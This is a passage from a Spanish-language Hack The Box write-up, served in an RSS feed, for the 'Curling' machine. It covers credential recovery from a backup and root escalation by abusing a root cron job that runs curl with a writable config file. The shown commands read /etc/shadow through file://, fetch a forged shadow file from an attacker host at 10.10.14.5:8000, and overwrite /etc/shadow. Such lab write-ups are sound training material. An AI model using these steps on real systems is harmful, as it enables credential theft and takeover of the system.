&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;www-data@curling:/tmp$ mv file_reverse file_reverse.bz2  
www-data@curling:/tmp$ bzip2 -d file_reverse.bz2
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Y como resultado ahora obtenemos:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;www-data@curling:/tmp$ file file_reverse 
file_reverse: POSIX tar archive (GNU)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Un objeto &lt;a href=&quot;https://www.howtogeek.com/248780/how-to-compress-and-extract-files-using-the-tar-command-on-linux/&quot;&gt;tar&lt;/a&gt;, descomprim√°moslo:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;www-data@curling:/tmp$ mv file_reverse file_reverse.tar.gz
www-data@curling:/tmp$ tar -xvf file_reverse.tar.gz 
password.txt
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Nos devuelve el objeto &lt;code&gt;password.txt&lt;/code&gt; y ese si parece ser un archivo de texto, validemos:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;www-data@curling:/tmp$ file password.txt 
password.txt: ASCII text
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Pos si, si vemos su contenido encontramos una cadena que si tiene toda la pinta de ser una credencial:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160bash_wwwdataSH_passwordTXT.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Pues si la validamos ya sea con &lt;code&gt;su floris&lt;/code&gt; o ejecutando en otra terminal &lt;code&gt;ssh floris@10.10.10.150&lt;/code&gt;, vamos a obtener lo mismo, una &lt;strong&gt;sesi√≥n en el sistema como &lt;code&gt;floris&lt;/code&gt;&lt;/strong&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù± ssh floris@10.10.10.150
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160bash_ssh_florisSH.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;PEEEERRRFECCCTOOOO!!&lt;/p&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;p&gt;Cree un script en &lt;code&gt;bash&lt;/code&gt; que va a moverse entre toooooodos los archivos modificando sus nombres y efectuando la dezcomprimhisazion:&lt;/p&gt;

&lt;p&gt;üî¢ &lt;a href=&quot;https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/curling/brutopress.sh&quot;&gt;brutopress.sh&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;h1 id=&quot;escalada-de-privilegios&quot;&gt;Escalada de privilegios &lt;a href=&quot;#escalada-de-privilegios&quot;&gt;#&lt;/a&gt;&lt;/h1&gt;

&lt;p&gt;Si recordamos hab√≠a una carpeta bastante llamativa en el &lt;code&gt;/home&lt;/code&gt; de &lt;strong&gt;floris&lt;/strong&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;floris@curling:~$ ls
admin-area  password_backup  user.txt
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Veamos que hay en ella:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160bash_florisSH_lsLA_HomeAdminPanel.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Jmmmm, si nos fijamos son archivos actuales y que tienen la misma hora-fecha de creaci√≥n/modificaci√≥n, YYYYY al estar en el grupo &lt;code&gt;floris&lt;/code&gt; tenemos acceso a modificarlos y leerlos, curioso, bastante curioso‚Ä¶&lt;/p&gt;

&lt;p&gt;Revisando el contenido de cada uno tenemos:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;floris@curling:~/admin-area$ cat input 
url = &quot;http://127.0.0.1&quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;floris@curling:~/admin-area$ cat report
&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html lang=&quot;en-gb&quot; dir=&quot;ltr&quot;&amp;gt;
&amp;lt;head&amp;gt;
        &amp;lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot; /&amp;gt;
        &amp;lt;meta charset=&quot;utf-8&quot; /&amp;gt;
        &amp;lt;base href=&quot;http://127.0.0.1/&quot; /&amp;gt;
        &amp;lt;meta name=&quot;description&quot; content=&quot;best curling site on the planet!&quot; /&amp;gt;
        &amp;lt;meta name=&quot;generator&quot; content=&quot;Joomla! - Open Source Content Management&quot; /&amp;gt;
        &amp;lt;title&amp;gt;Home&amp;lt;/title&amp;gt;
        ...
...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;El objeto &lt;code&gt;report&lt;/code&gt; tiene el mismo c√≥digo &lt;strong&gt;HTML&lt;/strong&gt; que si hacemos una petici√≥n hacia el recurso &lt;code&gt;http://10.10.10.150&lt;/code&gt;, con lo cual sabemos que internamente tambi√©n esta siendo ejecutado el &lt;strong&gt;CMS&lt;/strong&gt; &lt;code&gt;Joomla&lt;/code&gt;‚Ä¶&lt;/p&gt;

&lt;p&gt;Sin entender muy bien que hacer me puse a enumerar que instrucciones o acciones est√°n siendo ejecutadas de manera -automatizada- en el sistema.&lt;/p&gt;

&lt;p&gt;Existen varios m√©todos, pero hay una herramienta llamada &lt;a href=&quot;https://github.com/DominicBreuker/pspy&quot;&gt;pspy&lt;/a&gt; que hace un recorrido por el sistema buscando tareas que se est√©n ejecutando.&lt;/p&gt;

&lt;p&gt;Descargamos el binario de &lt;a href=&quot;https://github.com/DominicBreuker/pspy/releases&quot;&gt;ac√°&lt;/a&gt; y lo subimos a la m√°quina:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;# Creamos entorno de trabajo
floris@curling:/tmp$ mkdir miacosa
floris@curling:/tmp$ cd miacosa/
floris@curling:/tmp/miacosa$ curl http://10.10.14.5:8000/pspy -o pspy
floris@curling:/tmp/miacosa$ file pspy 
pspy: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, stripped
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Listo, ahora lo ejecutamos:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;floris@curling:/tmp/miacosa$ chmod +x pspy
floris@curling:/tmp/miacosa$ ./pspy
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160bash_florisSH_pspy_FOUNDcurl.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;OPAAAAAAAAAa, existen dos instrucciones siendo ejecutadas por el usuario &lt;code&gt;root&lt;/code&gt; (por el &lt;strong&gt;UID&lt;/strong&gt; (user id), &lt;strong&gt;&lt;em&gt;root&lt;/em&gt;&lt;/strong&gt; siempre tiene asignado &lt;code&gt;0&lt;/code&gt;), pero solo una nos llama la atenci√≥n, ya que esta interactuando con los archivos &lt;code&gt;input&lt;/code&gt; y &lt;code&gt;report&lt;/code&gt;, los dos objetos que encontramos antes y que ten√≠an fecha-hora igual. ¬°Ah√≠ esta la raz√≥n de eso!!&lt;/p&gt;

&lt;p&gt;Es ejecutada cada minuto:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160bash_florisSH_pspy_FOUNDcurlEACHminute.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;La instrucci√≥n es sencilla:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;/bin/sh -c curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;El par√°metro &lt;code&gt;-K&lt;/code&gt; toma un archivo de configuraci√≥n, en su contenido van instrucciones que &lt;code&gt;cURL&lt;/code&gt; interpretara, por ejemplo podemos pasarle &lt;code&gt;user-agent&lt;/code&gt;, &lt;code&gt;url&lt;/code&gt;, &lt;code&gt;output&lt;/code&gt;, &lt;code&gt;-L&lt;/code&gt; (para ver redirecciones), &lt;a href=&quot;https://everything.curl.dev/cmdline/configfile&quot;&gt;etc&lt;/a&gt;. Todos los argumentos con los que ejecutamos &lt;code&gt;cURL&lt;/code&gt; desde la terminal los podemos agregar en un archivo y pas√°rselo con el par√°metro &lt;code&gt;-K&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;‚öôÔ∏è &lt;code&gt;-K, --config &amp;lt;file&amp;gt;&lt;/code&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Specify a text file &lt;strong&gt;to read curl arguments from&lt;/strong&gt;. &lt;strong&gt;&lt;em&gt;The command line arguments found in the text file will be used as if they were provided on the command line&lt;/em&gt;&lt;/strong&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Como el √∫nico argumento actual en &lt;code&gt;input&lt;/code&gt; es:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;url = &quot;http://127.0.0.1&quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Esta haciendo una petici√≥n hacia esa &lt;strong&gt;URL&lt;/strong&gt; (:&lt;/p&gt;

&lt;p&gt;Y simplemente el resultado de la consulta la guarda en &lt;code&gt;report&lt;/code&gt; (con &lt;code&gt;-o&lt;/code&gt;). Sencillito de entender. Ahora veamos como romper esoooooooooooooooooooowoweoriwqeru‚Ä¶&lt;/p&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;h2 id=&quot;breaking-curlfig&quot;&gt;Jugando con el archivo que toma &lt;u&gt;cURL&lt;/u&gt; como configuraci√≥n &lt;a href=&quot;#breaking-curlfig&quot;&gt;üìå&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Intentando cositas como pasarle nuestra &lt;strong&gt;URL&lt;/strong&gt; de alg√∫n servidor &lt;code&gt;Python&lt;/code&gt;, recibimos la petici√≥n, pero claro, no tenemos posibilidad de indicarle que &lt;strong&gt;interprete&lt;/strong&gt; lo que sea que tengamos sirviendo üòû&lt;/p&gt;

&lt;p&gt;Buscando y buscando llegamos a este recurso del siempre fiel &lt;code&gt;GTFOBins&lt;/code&gt; (√©chenle un ojo, tiene muuuuuuuchas maneras de explotar muuuuuuuuuuchos binarios):&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://gtfobins.github.io/gtfobins/curl/&quot;&gt;https://gtfobins.github.io/gtfobins/curl/&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160google_gtfobins_curl_READfile.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Nos indica que si queremos leer archivos podemos usar &lt;code&gt;file://&lt;/code&gt; seguido del archivo en cuesti√≥n‚Ä¶ OPA, interesante, puees si la instrucci√≥n &lt;code&gt;cURL&lt;/code&gt; la esta ejecutando &lt;code&gt;root&lt;/code&gt; podemos ver archivos privilegiados, ¬øno? Puuuuuues intentemos ver el archivo que contiene tooodas las contrase√±as de los usuarios del sistema, el objeto &lt;a href=&quot;https://searchsecurity.techtarget.com/definition/shadow-password-file&quot;&gt;/etc/shadow&lt;/a&gt;:&lt;/p&gt;

&lt;p&gt;Debemos modificar el archivo &lt;code&gt;input&lt;/code&gt; con esto:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;floris@curling:/tmp/miacosa$ echo 'url = &quot;file:///etc/shadow&quot;'
url = &quot;file:///etc/shadow&quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Pues hag√°moslo:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160bash_florisSH_fileINPUT_originalETCshadow.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Y si revisamos el archivo &lt;code&gt;report&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160bash_florisSH_fileREPORT_originalETCshadow.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;¬°Qu√© maravillaaaaaaaaaaaaaaaaaaaaaaaaaaa!!&lt;/p&gt;

&lt;p&gt;Con esto ya podr√≠amos obtener la &lt;code&gt;flag&lt;/code&gt; de &lt;strong&gt;root&lt;/strong&gt;‚Ä¶&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;shadow-root&quot;&gt;Cambiamos la contrase√±a de &lt;u&gt;root&lt;/u&gt; para obtener una Shell en el sistema &lt;a href=&quot;#shadow-root&quot;&gt;üìå&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Probando maneras de obtener una &lt;strong&gt;Shell&lt;/strong&gt; con simplemente una subida y modificaci√≥n de archivos recorde una manera que interactuaba directamente con el archivo &lt;code&gt;/etc/shadow&lt;/code&gt;, en internet encontramos este post con una explicaci√≥n brutal:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://blog.geoda-security.com/2019/02/privilege-escalation-exploiting-write.html&quot;&gt;Privilege Escalation: Exploiting write access to /etc/shadow&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;Visiten el post, esta muy bueno y explica muuuchas cosas que no tocar√© ac√°.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;(En pocas palabras)‚Ä¶&lt;/p&gt;

&lt;p&gt;Una credencial del archivo &lt;code&gt;/etc/shadow&lt;/code&gt; normalmente tiene este formato:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;test:x:1002:1002:test,,,:/test:/bin/bash
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Donde de todos los campos (separados por &lt;code&gt;:&lt;/code&gt;) el que contiene la contrase√±a en este ejemplo es &lt;code&gt;x&lt;/code&gt;. Pero &lt;strong&gt;OJOOOOOOOOO&lt;/strong&gt;, la contrase√±a no es &lt;code&gt;x&lt;/code&gt; (por si no me hice entender) ü§™, donde esta la &lt;code&gt;x&lt;/code&gt; va el hash de la contrase√±a‚Ä¶&lt;/p&gt;

&lt;p&gt;Entonces, la explotaci√≥n se basa en &lt;strong&gt;remplazar&lt;/strong&gt; el &lt;code&gt;hash&lt;/code&gt; (la contrase√±a) de alg√∫n usuario con uno nuevo queeeeee haga referencia a una contrase√±a que conozcamos (obvio :P).&lt;/p&gt;

&lt;p&gt;Esto para iniciar sesi√≥n con esa nueva contrase√±a contra el usuario al que le cambiamos su &lt;code&gt;hash&lt;/code&gt; (contrase√±a).&lt;/p&gt;

&lt;p&gt;Ve√°moslo en la pr√°ctica.&lt;/p&gt;

&lt;p&gt;Tomamos el contenido original del archivo &lt;code&gt;/etc/shadow&lt;/code&gt;. Aprovechemos el archivo de configuraci√≥n para indicarle que nos guarde el resultado de la petici√≥n en otro archivo:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;floris@curling:/tmp/miacosa$ echo -e 'url = &quot;file:///etc/shadow&quot;\n-o /tmp/miacosa/shasha'
url = &quot;file:///etc/shadow&quot;
-o /tmp/miacosa/shasha
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;floris@curling:/tmp/miacosa$ echo -e 'url = &quot;file:///etc/shadow&quot;\n-o /tmp/miacosa/shasha' &amp;gt; /home/floris/admin-area/input
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Esperamos un momento y ya tendr√≠amos el archivo &lt;code&gt;shasha&lt;/code&gt; en nuestra carpeta de trabajo, (de todas las formas en que podemos pasarnos el archivo) tomamos su contenido, nos lo llevamos a nuestra m√°quina y generamos un nuevo archivo con √©l:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160bash_transport_ORIGINALshadowFILE.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Y ahora nos queda identificar que tipo de hash tiene el usuario &lt;code&gt;root&lt;/code&gt; para as√≠ mismo generar el nuestro con el formato correcto:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;root:$6$RIgrVboA$HDaB29xvtkw6U/Mzq4qOHH2KHB1kIR0ezFyjL75DszasVFwznrsWcc1Tu5E2K4FA7/Nv8oje0c.bljjnn6FMF1:17673:0:99999:7:::
...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;En el mismo post nos indica:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160google_shadow_typeHASH.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As√≠ que el algoritmo usado es &lt;code&gt;SHA-512&lt;/code&gt;, encontramos estas maneras de generarlos desde consola:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://rakeshjain-devops.medium.com/how-to-create-sha512-sha256-md5-password-hashes-on-command-line-2223db20c08c&quot;&gt;How to create SHA512/SHA256/MD5 password hashes on command line&lt;/a&gt;.&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://unix.stackexchange.com/questions/52108/how-to-create-sha512-password-hashes-on-command-line#answer-76337&quot;&gt;How to create SHA512 password hashes on command line&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Nos quedaremos con esta manera:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù± python3 -c 'import crypt; print(crypt.crypt(&quot;hola&quot;, crypt.mksalt(crypt.METHOD_SHA512)))'
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Donde &lt;code&gt;hola&lt;/code&gt; es la ‚Äúcontrase√±a‚Äù que queremos encriptar, pues generemos el hash para &lt;code&gt;ajatepille&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù± python3 -c 'import crypt; print(crypt.crypt(&quot;ajatepille&quot;, crypt.mksalt(crypt.METHOD_SHA512)))'
$6$4iWM54cNAlfhQmjI$ZXyO9QTKqY0iXUwcliHzZ.o8LjNyj.l9ZS6iw0gv7hj1vuUp2LwBykBkE2GFjsvggl2CA4HQInUCVYap6WznA0
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Perfect√≠simo, lo siguiente ser√° remplazar la contrase√±a de &lt;code&gt;root&lt;/code&gt; por la nueva:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;root:$6$4iWM54cNAlfhQmjI$ZXyO9QTKqY0iXUwcliHzZ.o8LjNyj.l9ZS6iw0gv7hj1vuUp2LwBykBkE2GFjsvggl2CA4HQInUCVYap6WznA0:17673:0:99999:7:::
...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Y como paso final debemos indicarle a la instrucci√≥n &lt;code&gt;cURL&lt;/code&gt; que tome ese contenido y lo remplac√© por el actual:&lt;/p&gt;

&lt;p&gt;(&lt;strong&gt;Levantamos un servidor web en la ruta donde est√© el archivo &lt;code&gt;shadow&lt;/code&gt;&lt;/strong&gt;)&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù± python3 -m http.server
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Y en el objeto &lt;code&gt;input&lt;/code&gt; indicamos:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;floris@curling:/tmp/miacosa$ echo -e 'url = &quot;http://10.10.14.5:8000/shadow&quot;\n-o /etc/shadow'
url = &quot;http://10.10.14.5:8000/shadow&quot;
-o /etc/shadow
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;floris@curling:/tmp/miacosa$ echo -e 'url = &quot;http://10.10.14.5:8000/shadow&quot;\n-o /etc/shadow' &amp;gt; /home/floris/admin-area/input 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Nos llegara la petici√≥n, leer√° el contenido del archivo hosteado (&lt;code&gt;shadow&lt;/code&gt;) y lo guardara en la ruta &lt;code&gt;/etc/shadow&lt;/code&gt;, o sea, el nuevo archivo ser√° el que contiene nuestra contrase√±a (:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160bash_transport_FAKEshadowFILE.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;YyyyyyyyyyyyYYYyyyYyyy si ahora intentamos conectarnos como &lt;code&gt;root&lt;/code&gt; con la contrase√±a &lt;code&gt;ajatepille&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160bash_rootSH_su.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;VAMOOOOOOOOOOOOOOONOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOS!! Conseguimos una &lt;strong&gt;Shell&lt;/strong&gt; como el usuario &lt;code&gt;root&lt;/code&gt; cambi√°ndole su contrase√±a, que belleza!!&lt;/p&gt;

&lt;p&gt;Veamos las flags:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160flags.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Y eso es todo por esta m√°quina :(:(:(:(:&lt;/p&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;p&gt;Bonito camino, lo de encontrar &lt;code&gt;secret.txt&lt;/code&gt; as√≠ como as√≠ en un comentario fue muy KLK, pero de resto fue de mucho aprendizaje.&lt;/p&gt;

&lt;p&gt;Y weno, nos reencontraremos en otra ocasi√≥n, a darle duro a todo yyyyyyyyyyyyyyyyyyy a seguir rompiendoOOO0oOOOOOOoooooTODOOOOOOOOooooOO!!&lt;/p&gt;
</description>
        <pubDate>Sat, 21 Aug 2021 00:00:00 -0700</pubDate>
        <link>http://localhost:4000/htb/curling</link>
        <guid isPermaLink="true">http://localhost:4000/htb/curling</guid>
        
        <category>joomla</category>
        
        <category>backup</category>
        
        <category>cURL-config-file</category>
        
        <category>/etc/shadow</category>
        
        
        <category>htb</category>
        
      </item>
    
  </channel>
</rss>
